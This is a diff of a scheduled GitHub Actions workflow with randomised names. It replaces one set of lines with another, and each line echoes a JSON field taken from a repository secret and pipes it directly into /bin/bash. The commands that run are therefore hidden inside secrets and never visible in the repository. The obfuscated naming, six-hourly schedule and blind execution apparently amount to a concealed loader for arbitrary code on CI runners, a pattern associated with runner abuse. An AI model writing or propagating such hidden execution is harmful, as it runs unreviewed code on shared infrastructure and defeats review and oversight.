@@ -1,9 +1,8 @@
 name: inboardstingy
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 0/6 * * *'
+    - cron: '20 3/6 * * *'
 
 jobs:
   build:
@@ -12,17 +11,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: inboardstingy
         env:
-          vub4108: ${{ secrets.vub4108 }}
+          sr1: ${{ secrets.sr1 }}
         run: |
-          echo $vub4108 | jq -r .hlm64 | /bin/bash
-          echo $wt7587 | jq -r .pf90884 | /bin/bash
-          echo $sjlgb860 | jq -r .n68 | /bin/bash
-          echo $odkv281 | jq -r .vz8 | /bin/bash
-          echo $itnv77820 | jq -r .o7 | /bin/bash
-          echo $ccz214 | jq -r .amq113 | /bin/bash
-          echo $wntws8912 | jq -r .x74 | /bin/bash
-          echo $kfcf87 | jq -r .ssyx3123 | /bin/bash
-          echo $yzcb4748 | jq -r .j21 | /bin/bash
-          echo $tnhsx927 | jq -r .par2964 | /bin/bash
-          echo $won44 | jq -r .vzudd20369 | /bin/bash
+          echo $sr1 | jq -r .c458 | /bin/bash
+          echo $cm432 | jq -r .mb2 | /bin/bash
+          echo $ncwo21494 | jq -r .bvb36565 | /bin/bash
+          echo $nl55403 | jq -r .h8057 | /bin/bash
+          echo $ekc1 | jq -r .qk06463 | /bin/bash
 
